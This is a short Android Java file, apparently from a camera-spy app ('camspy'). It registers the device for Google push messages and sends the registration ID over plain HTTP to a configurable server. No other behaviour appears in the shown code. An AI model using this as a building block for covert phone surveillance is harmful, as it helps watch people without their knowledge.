package org.omaps.camspy;

import org.omaps.config.SpyConfig;
import org.omaps.connection.HTTPCon;
import org.omaps.data.SpyData;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.google.android.gcm.GCMBaseIntentService;

public class GCMIntentService extends GCMBaseIntentService {

	public GCMIntentService() {
		super(SpyConfig.SPY_SENDER_ID);
	}

	@Override
	protected void onRegistered(Context arg0, String registrationId) {
		Log.i(SpyConfig.SPY_LOGGING, "Device registered: regId = " + registrationId);
		HTTPCon.getRequest("http://" + SpyData.getData().getBaseServer() + "/get_registerid_device.php?device_id=" + registrationId);
	}

	@Override
	protected void onUnregistered(Context arg0, String arg1) {
		Log.i(SpyConfig.SPY_LOGGING, "unregistered = " + arg1);
	}

	@Override
	protected void onMessage(Context arg0, Intent arg1) {
		Log.i(SpyConfig.SPY_LOGGING, "new message= ");
	}

	@Override
	protected void onError(Context arg0, String errorId) {
		Log.i(SpyConfig.SPY_LOGGING, "Received error: " + errorId);
	}

	@Override
	protected boolean onRecoverableError(Context context, String errorId) {
		return super.onRecoverableError(context, errorId);
	}
}
